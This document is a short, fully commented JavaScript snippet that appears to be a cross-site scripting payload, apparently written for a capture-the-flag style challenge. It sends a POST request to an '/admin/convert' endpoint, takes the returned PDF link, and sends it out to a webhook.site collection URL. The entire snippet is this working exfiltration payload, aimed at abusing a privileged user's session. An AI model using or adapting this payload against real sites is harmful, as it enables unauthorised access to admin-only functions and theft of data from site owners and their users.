const htmlCode = "some-random-value"; // Set the random value to send
const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
xhr.onload = function() { // Set the callback function to handle the response
  if (xhr.status === 200) { // If the response status is OK
    const response = JSON.parse(xhr.responseText); // Parse the response text as JSON
    const pdfLink = response.pdfLink; // Get the PDF link from the response
    // Send the PDF link to the webhook
    const webhookUrl = "https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?pdfLink=" + encodeURIComponent(pdfLink); // Set the webhook URL with the PDF link as a URL-encoded parameter
    const webhookRequest = new XMLHttpRequest(); // Create a new XMLHttpRequest object
    webhookRequest.open("GET", webhookUrl); // Set the request method and endpoint
    webhookRequest.send(); // Send the request with no data, since the PDF link is in the URL parameter
  }
};
xhr.onerror = function() { // Set the callback function to handle errors
  console.log("Error sending request."); // Log the error message
};
xhr.send(JSON.stringify({ htmlCode: htmlCode })); // Send the request with the random value in JSON format
